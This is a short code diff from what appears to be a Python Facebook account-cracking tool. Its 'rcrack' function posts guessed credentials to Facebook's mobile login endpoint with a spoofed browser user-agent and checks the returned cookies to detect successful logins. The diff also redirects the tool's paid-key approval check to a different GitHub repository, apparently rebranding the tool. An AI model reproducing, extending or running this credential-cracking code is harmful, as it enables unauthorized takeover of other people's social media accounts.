@@ -892,7 +892,7 @@ def rcrack(uid,pwx,tl):
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
             'viewport-width': '980',
-}
+			}
 
             lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
@@ -934,7 +934,7 @@ def main_apv():
     print(f" Your Key : \x1b[1;31m"+Xyteee)
     print("\x1b[1;92m--------------------------------------------------")
     try:
-        system = requests.get("https://github.com/sujonbbz/SUJON-PAID/blob/main/APPROVAL.txt").text 
+        system = requests.get("https://github.com/mrerror807-blip/Sizan2/blob/main/APPROVAL.txt").text 
         if Xyteee in system:
             print()
             msg = str(os.geteuid()) 
